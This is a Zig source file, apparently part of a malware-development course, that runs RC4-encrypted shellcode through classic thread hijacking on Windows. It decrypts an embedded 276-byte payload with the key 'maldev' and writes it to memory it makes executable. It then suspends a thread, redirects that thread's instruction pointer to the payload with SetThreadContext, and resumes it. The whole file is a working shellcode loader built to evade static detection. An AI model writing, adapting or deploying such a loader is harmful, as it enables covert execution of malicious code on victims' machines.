const std = @import("std");
const win = @import("zigwin32").everything;
const RC4 = @import("5.payload-encryption-rc4.zig").RC4;

const HANDLE = win.HANDLE;
const PAGE_PROTECTION_FLAGS = win.PAGE_PROTECTION_FLAGS;
const CONTEXT = win.CONTEXT;
const INFINITE = win.INFINITE;

// x86
// const CONTEXT_CONTROL = 0x00010001;

// x64
const CONTEXT_CONTROL = 0x00100001;

const VirtualAlloc = win.VirtualAlloc;
const VirtualFree = win.VirtualFree;
const VirtualProtect = win.VirtualProtect;
const GetThreadContext = win.GetThreadContext;
const SetThreadContext = win.SetThreadContext;
const GetLastError = win.GetLastError;
const CreateThread = win.CreateThread;
const SuspendThread = win.SuspendThread;
const ResumeThread = win.ResumeThread;
const WaitForSingleObject = win.WaitForSingleObject;
const CloseHandle = win.CloseHandle;

var shellcode = [_]u8{ 23, 141, 219, 17, 48, 196, 44, 252, 64, 174, 48, 190, 29, 155, 98, 30, 195, 233, 17, 243, 40, 11, 238, 187, 108, 245, 244, 137, 73, 52, 37, 197, 9, 237, 85, 80, 245, 61, 175, 26, 140, 251, 1, 219, 237, 249, 52, 48, 70, 16, 121, 146, 164, 218, 220, 11, 212, 208, 32, 169, 57, 149, 211, 127, 159, 141, 69, 183, 27, 158, 43, 0, 152, 168, 170, 194, 9, 11, 63, 63, 251, 112, 129, 200, 205, 213, 153, 63, 133, 163, 196, 80, 115, 42, 90, 152, 105, 161, 253, 239, 51, 195, 11, 43, 238, 56, 246, 249, 73, 132, 94, 250, 127, 238, 0, 79, 39, 236, 2, 146, 107, 108, 69, 92, 64, 204, 115, 125, 22, 49, 41, 70, 108, 35, 113, 150, 249, 51, 105, 115, 142, 79, 141, 109, 230, 192, 115, 133, 183, 69, 141, 34, 17, 164, 26, 82, 165, 8, 237, 111, 40, 30, 186, 170, 51, 166, 97, 188, 0, 29, 41, 97, 6, 51, 80, 80, 45, 108, 81, 143, 230, 134, 206, 252, 66, 196, 94, 108, 172, 236, 95, 212, 96, 120, 250, 196, 233, 199, 210, 210, 42, 186, 32, 157, 215, 61, 43, 206, 2, 31, 79, 170, 93, 171, 241, 104, 130, 115, 165, 57, 41, 89, 228, 179, 14, 42, 214, 16, 110, 6, 85, 199, 244, 231, 196, 150, 120, 53, 236, 129, 82, 166, 113, 192, 137, 104, 26, 15, 109, 168, 189, 184, 13, 10, 242, 243, 106, 29, 118, 229, 253, 121, 204, 49, 236, 17, 164, 106, 197, 255, 250, 148, 215, 32, 64, 93 };

fn runViaClassicThreadHijacking(h_thread: HANDLE, payload: []const u8) !void {
    const address = VirtualAlloc(
        null,
        payload.len,
        .{ .COMMIT = 1, .RESERVE = 1 },
        .{ .PAGE_READWRITE = 1 },
    ) orelse {
        std.debug.print("[!] VirtualAlloc Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualAllocFailed;
    };
    @memcpy(@as([*]u8, @ptrCast(address)), payload);

    var old_protection: PAGE_PROTECTION_FLAGS = undefined;
    if (VirtualProtect(
        address,
        payload.len,
        .{ .PAGE_EXECUTE_READWRITE = 1 },
        &old_protection,
    ) == 0) {
        std.debug.print("[!] VirtualProtect Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.VirtualProtectFailed;
    }

    var thread_context: CONTEXT = undefined;
    thread_context.ContextFlags = CONTEXT_CONTROL;
    if (GetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] GetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.GetThreadContextFailed;
    }

    // X86
    // thread_context.Eip = @intFromPtr(address);

    // X64
    thread_context.Rip = @intFromPtr(address);

    if (SetThreadContext(h_thread, &thread_context) == 0) {
        std.debug.print("[!] SetThreadContext Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.SetThreadContextFailed;
    }
}

fn dummyFunction() void {
    var i: u8 = 0;
    while (i < 100) {
        i += 1;
        std.debug.print("We are in the dummy function\n", .{});
        std.time.sleep(std.time.ns_per_s * 2);
    }
}

// pub fn main() !void {
//     var buf: [276]u8 = undefined;
//     var rc4 = RC4.init("maldev");
//     const decrypted_shellcode = rc4.decrypt(&buf, &shellcode);
//     const h_thread = CreateThread(
//         null,
//         0,
//         @ptrCast(&dummyFunction),
//         null,
//         .{ .THREAD_CREATE_SUSPENDED = 1 },
//         null,
//     ) orelse {
//         std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
//         return error.CreateThreadFailed;
//     };
//     defer _ = CloseHandle(h_thread);

//     try runViaClassicThreadHijacking(h_thread, decrypted_shellcode);

//     _ = ResumeThread(h_thread);
//     _ = WaitForSingleObject(h_thread, INFINITE);
// }

pub fn main() !void {
    var buf: [276]u8 = undefined;
    var rc4 = RC4.init("maldev");
    const decrypted_shellcode = rc4.decrypt(&buf, &shellcode);

    const h_thread = CreateThread(
        null,
        0,
        @ptrCast(&dummyFunction),
        null,
        .{},
        null,
    ) orelse {
        std.debug.print("[!] CreateThread Failed With Error: {s}\n", .{@tagName(GetLastError())});
        return error.CreateThreadFailed;
    };
    defer _ = CloseHandle(h_thread);

    std.time.sleep(std.time.ns_per_s * 10);

    _ = SuspendThread(h_thread);
    try runViaClassicThreadHijacking(h_thread, decrypted_shellcode);
    _ = ResumeThread(h_thread);

    _ = WaitForSingleObject(h_thread, INFINITE);
}
